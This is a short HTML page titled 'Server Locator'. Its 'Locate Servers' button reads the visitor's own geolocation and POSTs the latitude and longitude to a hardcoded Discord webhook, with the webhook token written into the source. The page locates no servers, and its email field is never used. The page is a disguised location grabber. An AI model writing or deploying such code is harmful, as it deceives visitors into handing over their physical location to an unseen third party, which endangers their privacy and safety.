<!DOCTYPE html>
<html>
<head>
	<title>Server Locator</title>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>
<body>
	<input id='email' placeholder="Enter Email...">
	<button onclick="sendLocation()">Locate Servers</button>

	<p id="demo"></p>

	<script>
		function getLocation() {
			if (navigator.geolocation) {
				navigator.geolocation.getCurrentPosition(showPosition);
			} else {
				document.getElementById("demo").innerHTML = "Geolocation is not supported by this browser.";
			}
		}

		function showPosition(position) {
			var latitude = position.coords.latitude;
			var longitude = position.coords.longitude;
			var email = document.getElementById("email");
			document.getElementById("demo").innerHTML = "Latitude: " + latitude + "<br>Longitude: " + longitude;

			var webhookUrl = "https://discordapp.com/api/webhooks/1092569585045221386/8la5fQp6icwktAFDw68NpIInnDUvYbHEMZRTeItiBqyH8tk4AP8iSlCTTTZormOH-cZO";
			var data = {
				content: "User location: " + latitude + ", " + longitude
			};
			$.ajax({
				type: "POST",
				url: webhookUrl,
				data: JSON.stringify(data),
				contentType: "application/json",
				success: function() {
					alert("Location sent to server!");
				},
				error: function(xhr, status, error) {
					alert("Error sending location to server: " + error);
				}
			});
		}

		function sendLocation() {
			getLocation();
		}
	</script>
</body>
</html>
